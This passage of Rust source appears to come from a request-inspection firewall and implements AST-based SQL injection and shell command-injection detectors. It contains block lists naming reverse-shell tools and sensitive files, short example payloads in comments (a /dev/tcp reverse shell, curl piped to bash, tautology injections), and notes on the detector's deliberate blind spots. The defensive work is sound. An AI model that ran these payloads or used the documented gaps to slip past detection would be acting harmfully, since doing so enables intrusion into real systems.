    let mut max_bracket: usize = 0;
    let mut prefixish: usize = 0;
    let mut word_start: Option<usize> = None;

    let close_word = |word_start: &mut Option<usize>, end: usize, prefixish: &mut usize| {
        if let Some(start) = word_start.take() {
            let word = s.get(start..end).unwrap_or_default();
            if word == "not" || word == "case" || word == "interval" {
                *prefixish += 1;
            }
        }
    };

    for (idx, c) in s.char_indices() {
        if c.is_ascii_alphanumeric() || c == '_' {
            if word_start.is_none() {
                word_start = Some(idx);
            }
            continue;
        }
        close_word(&mut word_start, idx, &mut prefixish);
        match c {
            '(' | '[' => {
                bracket += 1;
                max_bracket = max_bracket.max(bracket);
            }
            ')' | ']' => bracket = bracket.saturating_sub(1),
            // Unary prefixes that drive `sqlparser::parse_prefix` recursion. `+`/`-`
            // are the P2 fix; `~`/`!` were already counted.
            '~' | '!' | '+' | '-' => prefixish += 1,
            _ => {}
        }
        if max_bracket.saturating_add(prefixish) > MAX_AST_NESTING {
            return false;
        }
    }
    close_word(&mut word_start, s.len(), &mut prefixish);
    max_bracket.saturating_add(prefixish) <= MAX_AST_NESTING
}

/// Spend one AST attempt (subject to the per-request budget) parsing `sql` and
/// classifying it. Returns `None` when the budget is exhausted, the parse fails,
/// or the parse is an ordinary single-value query.
fn ast_attempt(sql: &str, state: &mut ContentInspectionState) -> Option<(&'static str, u8)> {
    if !state.try_take_ast_attempt() {
        return None;
    }
    let stmts = parse_wrapped(sql)?;
    classify_statements(&stmts)
}

/// Parse a wrapped statement string, returning the statements on a full,
/// consume-to-EOF parse. `parse_statements` (unlike `parse_expr`) never silently
/// truncates — trailing tokens are a parse error — so pitfall ① ("`parse_expr`
/// stops at the first unparseable token and reports the prefix as clean") cannot
/// mislead us: we never infer *clean* from a partial parse. A parse error yields
/// `None` (no signal — a parse failure is not, on its own, evidence of injection).
fn parse_wrapped(sql: &str) -> Option<Vec<Statement>> {
    Parser::new(&GenericDialect {})
        .with_recursion_limit(AST_RECURSION_LIMIT)
        .try_with_sql(sql)
        .ok()?
        .parse_statements()
        .ok()
}

/// Whether a binary operator is an arithmetic comparison (the shape of a SQL
/// tautology `1=1` / `'a'<>'b'`). Boolean `And`/`Or` and `Like` are intentionally
/// excluded — a tautology is a comparison **between two constants**.
const fn is_comparison_op(op: &BinaryOperator) -> bool {
    matches!(
        op,
        BinaryOperator::Eq
            | BinaryOperator::NotEq
            | BinaryOperator::Lt
            | BinaryOperator::LtEq
            | BinaryOperator::Gt
            | BinaryOperator::GtEq
            | BinaryOperator::Spaceship
    )
}

/// Whether an expression is a literal constant (a number / string / boolean /
/// null), unwrapping parentheses and unary sign. Used to decide a tautology:
/// a comparison **between two literals** (`1=1`, `'a'='a'`) is always-true/false
/// and never appears in a legitimate `col = <value>` — the value alone is one
/// literal, never a `literal <cmp> literal` sub-expression.
fn is_literal_expr(e: &Expr) -> bool {
    match e {
        Expr::Value(_) => true,
        Expr::Nested(inner) => is_literal_expr(inner),
        Expr::UnaryOp { expr, .. } => is_literal_expr(expr),
        _ => false,
    }
}

/// Whether an [`ObjectName`]'s final identifier names a dangerous SQL function.
fn is_dangerous_fn(name: &ObjectName) -> bool {
    name.0
        .last()
        .and_then(|part| match part {
            ObjectNamePart::Identifier(id) => Some(id.value.as_str()),
            ObjectNamePart::Function(_) => None,
        })
        .is_some_and(|n| AST_DANGEROUS_FNS.contains(&n.to_ascii_lowercase().as_str()))
}

/// Injection structures discovered while walking a `WHERE` expression.
#[derive(Default)]
struct AstFlags {
    dangerous_fn: bool,
    tautology: bool,
    subquery: bool,
}

/// Recursively collect injection structures from a `WHERE` expression. Depth is
/// bounded (the AST itself is already depth-limited by [`ast_structural_depth_ok`];
/// this guard is belt-and-braces so the walker can never recurse unbounded).
fn walk_where(e: &Expr, depth: usize, flags: &mut AstFlags) {
    if depth > 64 {
        return;
    }
    let d = depth + 1;
    match e {
        Expr::BinaryOp { left, op, right } => {
            if is_comparison_op(op) && is_literal_expr(left) && is_literal_expr(right) {
                flags.tautology = true;
            }
            walk_where(left, d, flags);
            walk_where(right, d, flags);
        }
        Expr::UnaryOp { expr, .. } | Expr::Nested(expr) | Expr::Cast { expr, .. } => walk_where(expr, d, flags),
        Expr::Like { expr, pattern, .. } | Expr::ILike { expr, pattern, .. } => {
            walk_where(expr, d, flags);
            walk_where(pattern, d, flags);
        }
        Expr::Between { expr, low, high, .. } => {
            walk_where(expr, d, flags);
            walk_where(low, d, flags);
            walk_where(high, d, flags);
        }
        Expr::InList { expr, list, .. } => {
            walk_where(expr, d, flags);
            for item in list {
                walk_where(item, d, flags);
            }
        }
        Expr::Function(func) => {
            if is_dangerous_fn(&func.name) {
                flags.dangerous_fn = true;
            }
        }
        Expr::Subquery(_) | Expr::Exists { .. } => flags.subquery = true,
        Expr::InSubquery { expr, .. } => {
            flags.subquery = true;
            walk_where(expr, d, flags);
        }
        _ => {}
    }
}

/// Classify a parsed statement list into an injection `(rule_key, confidence)`,
/// or `None` when it is an ordinary single-value query.
///
/// The input was wrapped as `select * from t where c = <input>` (pitfall ②:
/// UNION / stacked statements are invisible at the expression level, so we parse
/// at the **statement** level). A benign scalar produces exactly one statement
/// whose body is a `Select` with a `c = <literal>` `WHERE` and nothing else; every
/// branch below fires only on structure the *input* grafted in, which a single
/// value can never contribute.
fn classify_statements(stmts: &[Statement]) -> Option<(&'static str, u8)> {
    // Stacked query: the wrapper is one statement — more than one means the input
    // injected a statement separator.
    if stmts.len() > 1 {
        return Some(("ast.stacked", 90));
    }
    let Some(Statement::Query(query)) = stmts.first() else {
        return None;
    };
    classify_set_expr(&query.body, 0)
}

/// Classify a query body (recursing through a parenthesised sub-body).
fn classify_set_expr(body: &SetExpr, depth: usize) -> Option<(&'static str, u8)> {
    if depth > 64 {
        return None;
    }
    match body {
        // UNION / EXCEPT / INTERSECT grafted onto `c = <input>` — a value can
        // never introduce a set operation.
        SetExpr::SetOperation { .. } => Some(("ast.union", 85)),
        SetExpr::Select(select) => {
            let mut flags = AstFlags::default();
            if let Some(expr) = &select.selection {
                walk_where(expr, 0, &mut flags);
            }
            // Highest-confidence structure wins.
            if flags.dangerous_fn {
                Some(("ast.dangerous_fn", 85))
            } else if flags.tautology {
                Some(("ast.tautology", 80))
            } else if flags.subquery {
                Some(("ast.subquery", 78))
            } else {
                None
            }
        }
        SetExpr::Query(inner) => classify_set_expr(&inner.body, depth + 1),
        _ => None,
    }
}

/// `sqlparser`-rs true-AST `SQLi` detector (plan §11, P2).
///
/// The **second** detector in the `SqlInjection` family (alongside
/// [`StructuralSqlDetector`]); it parses each normalised view with `sqlparser` and
/// fires on parse-acceptability of an injection structure (UNION / stacked /
/// tautology / dangerous-function / subquery), returning a context-free
/// [`DetectionFinding`].
///
/// The three measured `sqlparser` pitfalls are handled structurally:
/// * **① silent `parse_expr` truncation** — we never use `parse_expr`; every parse
///   goes through [`parse_wrapped`] (`parse_statements`), which consumes to EOF or
///   errors, so a partial prefix parse can never be mistaken for a clean value.
/// * **② UNION / stacked invisible at expression level** — the input is wrapped in
///   a `select * from t where c = <input>` **statement** so set operations and
///   statement separators surface ([`classify_statements`]).
/// * **③ comments vanish in the AST** — comment obfuscation is caught at the char
///   layer: the preprocessor already emits a `CommentStripped` view (so the
///   detector re-runs on the de-commented form), and any injection whose source
///   view still carried a comment marker is labelled `ast.comment_obfusc`.
///
/// **Known, intentional fail-safe blind spots (not vulnerabilities).** This
/// detector deliberately under-detects a few shapes to hold false positives down;
/// they are covered by the structural (`StructuralSqlDetector`) and frozen Lane 1
/// (libinjection) detectors, and are recorded here so callers never assume the AST
/// layer alone is complete:
/// * **bare-truthy `OR`** (`' OR 1`, `OR true`, `OR 'x'`) — the tautology rule is
///   narrowed to `literal <cmp> literal`, so a bare truthy literal with no
///   comparison operator does not fire on the AST path (narrowing suppresses the
///   large FP surface of "any `OR <value>`").
/// * **bracket/quote-breakout `UNION`** (`1) union select …`, `1') union select …`)
///   — the numeric and single-quote wrappers both fail to parse the broken-out
///   context, so no AST set-operation surfaces.
/// * **`ORDER BY` / projection-position / `INTO OUTFILE` injection** — these
///   positions are not reachable from the value-context wrapper under
///   `GenericDialect`, so the AST does not model them.
pub struct AstSqlDetector {
    _private: (),
}

impl AstSqlDetector {
    #[must_use]
    pub const fn new() -> Self {
        Self { _private: () }
    }
}

impl Default for AstSqlDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for AstSqlDetector {
    fn id(&self) -> DetectorId {
        DetectorId::Ast
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let s = view.lower_trunc.as_str();
        if s.is_empty() {
            return None;
        }
        // Cheap gate — clean traffic exits here without touching the AST budget.
        if !ast_prefilter(s) {
            return None;
        }
        // Stack-safety: decline deeply-nested input before it reaches the parser.
        if !ast_structural_depth_ok(s) {
            return None;
        }
        // DoS byte budget (per-request total across all views).
        if !state.try_take_ast_input_bytes(s.len()) {
            return None;
        }

        let has_comment = s.contains("--") || s.contains("/*") || s.contains('#');

        // Numeric / bareword context — catches UNION, stacked, `1 or 1=1`,
        // `1 and sleep(5)`, subqueries. On a miss, fall back (only when the input
        // carries a quote) to the single-quote breakout context — pitfall ①:
        // `1' or '1'='1` breaks out of a quoted value, and the quoted wrapper
        // reveals the tautology the numeric wrapper cannot parse.
        let (structural_key, confidence) =
            ast_attempt(&format!("select * from t where c = {s}"), state).or_else(|| {
                if s.contains('\'') {
                    ast_attempt(&format!("select * from t where c = '{s}'"), state)
                } else {
                    None
                }
            })?;
        // Pitfall ③: a confirmed injection whose source view still carried a comment
        // marker is comment-obfuscated (the AST alone cannot see the comment).
        let rule_key = if has_comment {
            "ast.comment_obfusc"
        } else {
            structural_key
        };
        Some(DetectionFinding {
            attack: AttackKind::SqlInjection,
            confidence: Confidence::saturating(confidence),
            rule_key,
            detail: Cow::Owned(format!(
                "ast sqli structure '{rule_key}' matched (confidence {confidence})"
            )),
        })
    }
}

// ── RCE true shell-AST detector (T1-A, brush-parser) ──────────────────────────

/// Per-view byte cap for the shell-AST parse — a hard `DoS` backstop applied
/// *before* the parse so a single oversized view can never drive an unbounded
/// parse. Larger views are declined (the request is not marked degraded here — a
/// too-large field is simply not AST-inspected; the structural [`RceStructuralDetector`]
/// still runs on it). Chosen generously enough to hold a realistic reverse-shell /
/// here-doc payload while bounding worst-case parser work.
const SHELL_AST_MAX_INPUT_BYTES: usize = 2048;

/// Maximum AST-walk recursion depth (subshell / brace-group / function nesting).
/// A payload nested deeper than this is not walked further — a documented honest
/// boundary, never a panic (the walk simply stops descending).
const SHELL_WALK_MAX_DEPTH: usize = 32;

/// Maximum nesting depth of shell recursion-driving delimiters that may be handed
/// to the brush-parser tokenizer. `brush-parser`'s recursive-descent **tokenizer**
/// has no internal depth bound, so a deeply nested `$( … )` / `$(( … ))` /
/// `{ … }` / backtick payload drives unbounded recursion and overflows the worker's
/// (2 MiB) thread stack *during lexing* — earlier than [`SHELL_WALK_MAX_DEPTH`]
/// (a post-parse walk bound) or [`SHELL_AST_MAX_INPUT_BYTES`] (a byte cap) can help,
/// and a Rust stack overflow aborts the process (`catch_unwind` cannot intercept it).
/// Measured overflow onset is ~150–170 nested `$(`; this bound sits far below it so a
/// too-deep payload is *declined before any brush-parser call* (the structural
/// [`RceStructuralDetector`] still inspects the field — the request is not degraded).
const SHELL_MAX_NESTING_DEPTH: usize = 20;

/// Maximum number of per-word command-substitution re-parses in one detector
/// invocation. Bounds the extra [`shell_word::parse`] work a wide command line can
/// trigger; beyond it, later words are not sub-parsed for `$(…)` / backtick
/// substitutions (the top-level structural rules still fire).
const SHELL_MAX_WORD_PARSES: usize = 32;

/// Interpreter binaries whose presence as a command head — with an inline-code
/// exec flag, a here-doc, or as a pipeline sink — is a command-execution signal.
/// `python*` is matched by prefix (`python3`, `python3.11`) in [`is_interpreter`].
const INTERPRETERS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "ash",
    "busybox",
    "python",
    "perl",
    "ruby",
    "php",
    "node",
    "nodejs",
    "lua",
    "powershell",
    "pwsh",
];

/// Network utilities used to build reverse / bind shells.
const NET_SHELLS: &[&str] = &["nc", "ncat", "netcat", "telnet", "socat"];

/// File-reader commands — dangerous only when their argument is a sensitive path
/// (the AST corroboration of the structural `rce.sensitive_read`).
const READERS: &[&str] = &["cat", "less", "more", "head", "tail", "nl", "od", "xxd", "strings"];

/// Inline-code / exec flags: `sh -c`, `python -c`, `perl -e`, `nc -e`,
/// `powershell -enc`. Compared case-insensitively against a whole argument word.
const EXEC_FLAGS: &[&str] = &["-c", "-e", "-enc", "-encodedcommand", "-command"];

/// Sensitive absolute paths that make a reader command a disclosure attempt.
const SENSITIVE_PATHS: &[&str] = &["/etc/passwd", "/etc/shadow", "/proc/self", "/proc/version"];

/// Commands whose appearance as the head of a `$(…)` / backtick command
/// substitution promotes it from the high-noise `rce_ast.cmd_subst_any`
/// (default-off) to the default-on `rce_ast.cmd_subst`. Union of the interpreter /
/// net / reader sets plus the classic recon binaries.
const DANGER_CMDS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "ash",
    "busybox",
    "python",
    "perl",
    "ruby",
    "php",
    "node",
    "nodejs",
    "lua",
    "powershell",
    "pwsh",
    "nc",
    "ncat",
    "netcat",
    "telnet",
    "socat",
    "cat",
    "less",
    "more",
    "head",
    "tail",
    "nl",
    "od",
    "xxd",
    "strings",
    "id",
    "whoami",
    "uname",
    "wget",
    "curl",
    "hostname",
    "ifconfig",
    "ip",
    "env",
    "printenv",
    "nslookup",
    "dig",
    "ping",
    "pwd",
    "rm",
    "chmod",
    "chown",
    "kill",
    "mkfifo",
];

/// Whether a (basename-lowercased) command name is a shell/script interpreter.
/// `python*` is matched by prefix so versioned binaries (`python3`, `python3.11`)
/// are covered without listing each.
fn is_interpreter(name: &str) -> bool {
    INTERPRETERS.contains(&name) || name.starts_with("python")
}

/// Canonicalise a word value to a bare command name for matching: drop a single
/// layer of surrounding quotes, take the trailing path component, lowercase.
/// Best-effort — a word that is itself an expansion (`$x`, `$(…)`) yields a name
/// that matches nothing, which is intentional (those are handled separately).
fn cmd_basename(word_value: &str) -> String {
    let unquoted = word_value.trim_matches(|c| c == '\'' || c == '"');
    let base = unquoted.rsplit(['/', '\\']).next().unwrap_or(unquoted);
    base.to_ascii_lowercase()
}

/// The plain command-head name of a simple command, if it has one.
fn simple_cmd_name(sc: &shell_ast::SimpleCommand) -> Option<String> {
    sc.word_or_name.as_ref().map(|w| cmd_basename(&w.value))
}

/// Whether a redirect-target word denotes a `/dev/tcp` or `/dev/udp` pseudo-device
/// (the bash reverse-shell channel, e.g. `>& /dev/tcp/10.0.0.1/4444`).
fn is_devtcp_target(word_value: &str) -> bool {
    let l = word_value.to_ascii_lowercase();
    l.contains("/dev/tcp/") || l.contains("/dev/udp/")
}

/// Whether a word value contains a sensitive absolute path (substring match on the
/// canonical forms — a `cat /etc/passwd` argument or a `cat$IFS/etc/passwd` form
/// already collapsed by the shell-normalise view).
fn arg_hits_sensitive_path(word_value: &str) -> bool {
    let l = word_value.to_ascii_lowercase();
    SENSITIVE_PATHS.iter().any(|p| l.contains(p))
}

/// Whether the inner text of a command substitution leads with a dangerous binary
/// (so `$(id)`, `` `cat /etc/passwd` `` fire the default-on rule while `$(date)` /
/// jQuery-style `$('#x')` do not).
fn cmdsubst_inner_is_dangerous(inner: &str) -> bool {
    inner
        .split_whitespace()
        .next()
        .map(cmd_basename)
        .is_some_and(|first| DANGER_CMDS.contains(&first.as_str()))
}

/// The shell-AST rule table: `(rule_key, confidence, default_on)`. Confidences are
/// pre-holdout shadow starting values (plan §8.2 spirit). The high-noise
/// `rce_ast.cmd_subst_any` (any command substitution regardless of inner command)
/// ships **disabled** pending holdout calibration, exactly like the structural
/// detector's default-off rows.
struct ShellAstRule {
    key: &'static str,
    confidence: u8,
    default_on: bool,
}

const RCE_AST_RULES: &[ShellAstRule] = &[
    // `/dev/tcp` redirect, or `nc -e` — a complete reverse/bind-shell structure.
    ShellAstRule {
        key: "rce_ast.reverse_shell",
        confidence: 90,
        default_on: true,
    },
    // Interpreter fed by a here-document / here-string: `python <<EOF … EOF`,
    // `bash <<< "id"`. The structural detector has ZERO here-doc coverage.
    ShellAstRule {
        key: "rce_ast.heredoc_interp",
        confidence: 82,
        default_on: true,
    },
    // Interpreter with an inline-code exec flag as a real command head: `bash -c`,
    // `python -c`, `perl -e`, `powershell -enc`.
    ShellAstRule {
        key: "rce_ast.interp_exec_flag",
        confidence: 82,
        default_on: true,
    },
    // A pipeline whose downstream stage is an interpreter / net-shell: `curl x | bash`.
    ShellAstRule {
        key: "rce_ast.pipe_to_interp",
        confidence: 80,
        default_on: true,
    },
    // Command substitution whose inner command is a dangerous binary: `$(id)`.
    ShellAstRule {
        key: "rce_ast.cmd_subst",
        confidence: 78,
        default_on: true,
    },
    // Process substitution `<(…)` / `>(…)` — always a code-execution construct.
    ShellAstRule {
        key: "rce_ast.proc_subst",
        confidence: 72,
        default_on: true,
    },
    // Reader command against a sensitive path: `cat /etc/passwd` (AST corroboration).
    ShellAstRule {
        key: "rce_ast.sensitive_read",
        confidence: 70,
        default_on: true,
    },
    // DEFAULT-OFF (high-noise): any command substitution regardless of inner
    // command — jQuery `$('#x')` / template `$(var)` false-positive, so this awaits
    // holdout calibration.
    ShellAstRule {
        key: "rce_ast.cmd_subst_any",
        confidence: 50,
        default_on: false,
    },
];

fn rce_ast_rule(key: &str) -> Option<&'static ShellAstRule> {
    RCE_AST_RULES.iter().find(|r| r.key == key)
}

/// Mutable accumulator threaded through the AST walk — records every fired rule key
/// and bounds the per-word substitution re-parses.
struct ShellWalk<'a> {
    opts: &'a ParserOptions,
    fired: Vec<&'static str>,
    word_parses: usize,
}

impl ShellWalk<'_> {
    fn fire(&mut self, key: &'static str) {
        // Small, bounded set — a linear `contains` keeps the vec free of duplicates
        // without a hash allocation.
        if !self.fired.contains(&key) {
            self.fired.push(key);
        }
    }
}

/// `brush-parser` true shell-AST RCE detector (T1-A).
///
/// The **second** detector in the `Rce` family alongside [`RceStructuralDetector`];
/// it parses each decoded [`View`]'s text into a real shell syntax tree and fires
/// on dangerous *structures* the structural regex cannot see or over-matches on.
///
/// It inspects `view.text` (**not** `lower_trunc`, which collapses newlines and so
/// destroys here-document structure), applies a cheap metacharacter prefilter so
/// clean traffic never spends parser budget, and meters every parse against the
/// shared per-request AST budget ([`ContentInspectionState::try_take_ast_attempt`]
/// / [`try_take_ast_input_bytes`](ContentInspectionState::try_take_ast_input_bytes)).
/// Parsing is pure (no execution, no `unwrap`): a tokenize / parse error yields no
/// signal.
///
/// **Honest boundary (plan §5).** This is a *parser*, not an expander: brace
/// expansion (`{a,b}`) is represented but never expanded, so a brace-obfuscated
/// command name is not resolved here — that gap stays with the structural layer.
/// The walk descends into subshell / brace-group / function bodies (the wrappers
/// used to hide an injected command) but not into `if` / `for` / `while` / `case`
/// bodies; those forms are out of scope for T1-A.
pub struct RceAstDetector {
    opts: ParserOptions,
    all_rules: bool,
}

impl RceAstDetector {
    /// Production detector — only the default-on rules may fire.
    #[must_use]
    pub fn new() -> Self {
        Self {
            opts: ParserOptions::default(),
            all_rules: false,
        }
    }

    /// Test-only: allow every rule (including the default-off `cmd_subst_any`) to fire.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self {
            opts: ParserOptions::default(),
            all_rules: true,
        }
    }

    /// Parse `s` into a shell program, or `None` on a tokenize / parse failure.
    /// Pure: no execution, no panic — an error simply yields no signal.
    fn parse_program(&self, s: &str) -> Option<shell_ast::Program> {
        let tokens = brush_parser::tokenize_str(s).ok()?;
        brush_parser::parse_tokens(&tokens, &self.opts).ok()
    }
}

impl Default for RceAstDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for RceAstDetector {
    fn id(&self) -> DetectorId {
        DetectorId::RceAst
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        // Parse the structure-preserving text, NOT `lower_trunc` (which collapses
        // the newlines a here-document needs).
        let s = view.text.as_ref();
        if s.is_empty() || s.len() > SHELL_AST_MAX_INPUT_BYTES {
            return None;
        }
        // Cheap gate — clean traffic exits here without touching the AST budget.
        if !shell_ast_prefilter(s) {
            return None;
        }
        // Stack-overflow guard (P0 DoS): brush-parser's recursive-descent tokenizer
        // has no depth bound, so decline a payload whose delimiter nesting could
        // overflow the worker stack *before* handing it to `tokenize_str`. A Rust
        // stack overflow aborts the process and cannot be caught, so this must be a
        // pre-parse reject; the structural detector still inspects the field.
        if max_nesting_depth(s) > SHELL_MAX_NESTING_DEPTH {
            return None;
        }
        // DoS budget: one attempt + input bytes, shared with the SQL AST layer.
        if !state.try_take_ast_attempt() {
            return None;
        }
        if !state.try_take_ast_input_bytes(s.len()) {
            return None;
        }

        let program = self.parse_program(s)?;
        let mut walk = ShellWalk {
            opts: &self.opts,
            fired: Vec::new(),
            word_parses: 0,
        };
        walk_program(&program, &mut walk);

        // Pick the strongest ENABLED fired rule (default-on only in production).
        let all = self.all_rules;
        let best = walk
            .fired
            .iter()
            .filter_map(|k| rce_ast_rule(k))
            .filter(|r| all || r.default_on)
            .max_by_key(|r| r.confidence)?;

        Some(DetectionFinding {
            attack: AttackKind::Rce,
            confidence: Confidence::saturating(best.confidence),
            rule_key: best.key,
            detail: Cow::Owned(format!(
                "ast rce structure '{}' matched (confidence {})",
                best.key, best.confidence
            )),
        })
    }
}

/// Cheap pre-parse gate: only strings carrying a shell metacharacter / exec-flag
/// shape, or a sensitive path, are worth a parse attempt. Every default-on
/// shell-AST structure contains one of these markers (`|`, `$(`, backtick, `<<`,
/// `<(`/`>(`, `/dev/tcp`, an exec-flag token) — and the reader-against-sensitive-path
/// rule is admitted by the `/etc/` and `/proc/` markers — so gating on them never
/// drops a catch; it only spares clean traffic the parser budget. Deliberately does
/// **not** substring-match short interpreter names (`sh` occurs in `fresh`/`wash`),
/// which would waste attempts.
fn shell_ast_prefilter(s: &str) -> bool {
    s.contains('|')
        || s.contains("$(")
        || s.contains('`')
        || s.contains("<<")
        || s.contains("<(")
        || s.contains(">(")
        || s.contains("/dev/tcp")
        || s.contains("/dev/udp")
        || s.contains(" -c")
        || s.contains(" -e")
        || s.contains("/etc/")
        || s.contains("/proc/")
}

/// Cheap single-pass scan of the maximum number of *concurrently unclosed*
/// recursion-driving shell delimiters in `s` — the stack-overflow protection for
/// the AST parse (plan §8, P0 `DoS`). Tracks, and returns the running maximum sum of:
/// - parentheses (`(` … `)`) — covers `$( … )` command substitution, `( … )`
///   subshells, `$(( … ))` / `(( … ))` arithmetic, and `<( … )` / `>( … )` process
///   substitution (every one opens with a `(`);
/// - brace groups (`{ … }`) — covers `${ … }` parameter expansion and `{ …; }`;
/// - backtick command substitution (`` ` … ` ``) — paired by toggling.
///
/// Deliberately quote- and escape-agnostic: a conservative *over*-count only causes
/// an early decline (safe — the structural detector still runs), never a missed
/// parse. Pure, no allocation, no brush-parser call.
fn max_nesting_depth(s: &str) -> usize {
    let mut paren: usize = 0;
    let mut brace: usize = 0;
    let mut backtick: usize = 0;
    let mut max_depth: usize = 0;
    for b in s.bytes() {
        match b {
            b'(' => paren += 1,
            b')' => paren = paren.saturating_sub(1),
            b'{' => brace += 1,
            b'}' => brace = brace.saturating_sub(1),
            b'`' => backtick ^= 1,
            _ => continue,
        }
        let depth = paren + brace + backtick;
        if depth > max_depth {
            max_depth = depth;
        }
    }
    max_depth
}

/// Walk every complete command of a parsed program.
fn walk_program(program: &shell_ast::Program, walk: &mut ShellWalk<'_>) {
    for cc in &program.complete_commands {
        walk_list(cc, 0, walk);
    }
}

/// Walk a compound list (a `CompleteCommand` or a subshell / brace-group body).
fn walk_list(list: &shell_ast::CompoundList, depth: usize, walk: &mut ShellWalk<'_>) {
    if depth > SHELL_WALK_MAX_DEPTH {
        return;
    }
    for item in &list.0 {
        walk_and_or(&item.0, depth, walk);
    }
}

/// Walk an and-or list (`a && b || c`) — the leading pipeline plus each continuation.
fn walk_and_or(aol: &shell_ast::AndOrList, depth: usize, walk: &mut ShellWalk<'_>) {
    walk_pipeline(&aol.first, depth, walk);
    for ao in &aol.additional {
        let (shell_ast::AndOr::And(p) | shell_ast::AndOr::Or(p)) = ao;
        walk_pipeline(p, depth, walk);
    }
}

/// Walk a pipeline: flag a pipe whose downstream stage is an interpreter / net-shell
/// (`curl x | bash`), then descend into each stage command.
fn walk_pipeline(pipe: &shell_ast::Pipeline, depth: usize, walk: &mut ShellWalk<'_>) {
    if pipe.seq.len() >= 2 {
        for cmd in pipe.seq.iter().skip(1) {
            if let shell_ast::Command::Simple(sc) = cmd
                && let Some(name) = simple_cmd_name(sc)
                && (is_interpreter(&name) || NET_SHELLS.contains(&name.as_str()))
            {
                walk.fire("rce_ast.pipe_to_interp");
            }
        }
    }
    for cmd in &pipe.seq {
        walk_command(cmd, depth, walk);
    }
}

/// Walk one command node.
fn walk_command(cmd: &shell_ast::Command, depth: usize, walk: &mut ShellWalk<'_>) {
    match cmd {
        shell_ast::Command::Simple(sc) => classify_simple(sc, walk),
        shell_ast::Command::Compound(cc, _redirects) => walk_compound(cc, depth + 1, walk),
        shell_ast::Command::Function(fd) => walk_compound(&fd.body.0, depth + 1, walk),
        shell_ast::Command::ExtendedTest(_, _) => {}
    }
}

/// Descend into the obfuscation wrappers an injected command hides behind: a
/// subshell `( … )` and a brace group `{ …; }`. `if`/`for`/`while`/`case` bodies
/// are intentionally out of scope for T1-A (documented honest boundary).
fn walk_compound(cc: &shell_ast::CompoundCommand, depth: usize, walk: &mut ShellWalk<'_>) {
    if depth > SHELL_WALK_MAX_DEPTH {
        return;
    }
    match cc {
        shell_ast::CompoundCommand::Subshell(s) => walk_list(&s.list, depth, walk),
        shell_ast::CompoundCommand::BraceGroup(b) => walk_list(&b.list, depth, walk),
        _ => {}
    }
}

/// Classify a single simple command against the shell-AST rule set.
fn classify_simple(sc: &shell_ast::SimpleCommand, walk: &mut ShellWalk<'_>) {
    let name = simple_cmd_name(sc);
    let name_is_interp = name.as_deref().is_some_and(is_interpreter);
    let name_is_net = name.as_deref().is_some_and(|n| NET_SHELLS.contains(&n));
    let name_is_reader = name.as_deref().is_some_and(|n| READERS.contains(&n));

    let mut has_exec_flag = false;
    let mut has_heredoc = false;
    let mut devtcp_redir = false;
    let mut sensitive_arg = false;
    let mut proc_subst = false;

    // The command head itself may be a substitution (`$(id)` as the command).
    if let Some(w) = &sc.word_or_name {
        classify_word_cmdsubst(&w.value, walk);
    }

    let empty = Vec::new();
    let prefix_items = sc.prefix.as_ref().map_or(&empty, |p| &p.0);
    let suffix_items = sc.suffix.as_ref().map_or(&empty, |s| &s.0);
    for item in prefix_items.iter().chain(suffix_items.iter()) {
        match item {
            shell_ast::CommandPrefixOrSuffixItem::Word(w) => {
                if EXEC_FLAGS.contains(&w.value.to_ascii_lowercase().as_str()) {
                    has_exec_flag = true;
                }
                if arg_hits_sensitive_path(&w.value) {
                    sensitive_arg = true;
                }
                classify_word_cmdsubst(&w.value, walk);
            }
            shell_ast::CommandPrefixOrSuffixItem::AssignmentWord(_, w) => {
                // `x=$(id) cmd` — a substitution smuggled through an assignment.
                classify_word_cmdsubst(&w.value, walk);
            }
            shell_ast::CommandPrefixOrSuffixItem::ProcessSubstitution(_, _) => proc_subst = true,
            shell_ast::CommandPrefixOrSuffixItem::IoRedirect(io) => match io {
                shell_ast::IoRedirect::HereDocument(_, _) | shell_ast::IoRedirect::HereString(_, _) => {
                    has_heredoc = true;
                }
                shell_ast::IoRedirect::File(_, _, target) => match target {
                    shell_ast::IoFileRedirectTarget::Filename(w) | shell_ast::IoFileRedirectTarget::Duplicate(w) => {
                        if is_devtcp_target(&w.value) {
                            devtcp_redir = true;
                        }
                    }
                    shell_ast::IoFileRedirectTarget::ProcessSubstitution(_, _) => proc_subst = true,
                    shell_ast::IoFileRedirectTarget::Fd(_) => {}
                },
                shell_ast::IoRedirect::OutputAndError(w, _) => {
                    if is_devtcp_target(&w.value) {
                        devtcp_redir = true;
                    }
                }
            },
        }
    }

    if devtcp_redir || (name_is_net && has_exec_flag) {
        walk.fire("rce_ast.reverse_shell");
    }
    if name_is_interp && has_heredoc {
        walk.fire("rce_ast.heredoc_interp");
    }
    if name_is_interp && has_exec_flag {
        walk.fire("rce_ast.interp_exec_flag");
    }
    if name_is_reader && sensitive_arg {
        walk.fire("rce_ast.sensitive_read");
    }
    if proc_subst {
        walk.fire("rce_ast.proc_subst");
    }
}

/// Sub-parse a word value for `$(…)` / backtick command substitutions and fire the
/// (dangerous-inner) / (any) substitution rules. Cheap-gated on the literal markers
/// and bounded by [`SHELL_MAX_WORD_PARSES`], so plain words never touch the word
/// parser.
fn classify_word_cmdsubst(value: &str, walk: &mut ShellWalk<'_>) {
    if walk.word_parses >= SHELL_MAX_WORD_PARSES {
        return;
    }
    if !(value.contains("$(") || value.contains('`')) {
        return;
    }
    walk.word_parses += 1;
    let Ok(pieces) = shell_word::parse(value, walk.opts) else {
        return;
    };
    scan_word_pieces(&pieces, walk);
}

/// Recurse through parsed word pieces (descending into double-quoted sequences)
/// firing the command-substitution rules.
fn scan_word_pieces(pieces: &[WordPieceWithSource], walk: &mut ShellWalk<'_>) {
    for pw in pieces {
        match &pw.piece {
            WordPiece::CommandSubstitution(inner) | WordPiece::BackquotedCommandSubstitution(inner) => {
                if cmdsubst_inner_is_dangerous(inner) {
                    walk.fire("rce_ast.cmd_subst");
                } else {
